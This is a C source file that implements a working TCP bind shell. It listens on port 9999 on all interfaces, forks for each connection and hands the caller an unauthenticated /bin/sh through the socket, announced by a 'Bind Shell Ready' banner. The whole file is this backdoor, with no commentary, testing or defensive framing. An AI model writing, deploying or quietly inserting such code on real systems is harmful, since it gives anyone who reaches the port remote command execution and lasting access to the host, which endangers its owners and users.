#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define SERVER_PORT 9999

int main() {
    int serverfd, clientfd;
    pid_t pid;
    socklen_t len;
    struct sockaddr_in server, client;
    char *banner = "[~] Bind Shell Ready\n";
    char *args[] = { "/bin/sh", NULL };

    signal(SIGCHLD, SIG_IGN); // avoid zombie

    serverfd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverfd < 0) return 1;

    int yes = 1;
    setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverfd, (struct sockaddr *)&server, sizeof(server)) < 0)
        return 1;

    if (listen(serverfd, 5) < 0)
        return 1;

    while (1) {
        len = sizeof(client);
        clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
        if (clientfd < 0) continue;

        pid = fork();
        if (pid == 0) {
            // child
            write(clientfd, banner, strlen(banner));

            dup2(clientfd, 0);
            dup2(clientfd, 1);
            dup2(clientfd, 2);

            execve("/bin/sh", args, (char *) 0);
            exit(0);
        }

        // parent cleanup
        close(clientfd);
    }

    close(serverfd);
    return 0;
}
